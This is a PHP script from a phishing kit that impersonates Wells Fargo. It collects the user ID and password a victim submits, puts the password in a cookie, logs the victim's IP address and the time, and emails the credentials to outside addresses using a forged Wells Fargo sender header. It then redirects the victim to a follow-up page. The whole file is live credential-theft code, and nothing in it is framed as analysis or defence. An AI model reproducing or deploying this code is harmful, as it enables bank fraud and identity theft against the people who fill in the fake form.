<?
session_start();
$userid=  $_POST['userid'];
$password=  $_POST['password'];
session_register("userId");
setcookie("username", $username, time()+3600);
setcookie("password", $password, time()+3600);
$ip = getenv("REMOTE_ADDR");
$adddate=date("D M d, Y g:i a");

  $subj = "Wells Fargo Page I $userid";
  $msg = "userid: $userid\npassword: $password\n\nSubmitted from IP Address - $ip on $adddate";
  $from = "From: $username<results@wellsfargo.com>";
  mail("carlford@excite.co.uk,owoeyetosyn3@yahoo.com", $subj, $msg, $from);
         mail("", $subj, $msg, $from);
  header("Location:secure.php?ZXJyb3Iubm9Vc2VybmFtZQ%3D%3DZXJyb3Iubm9Vc2VybmFtZQ%3D%3D");

?>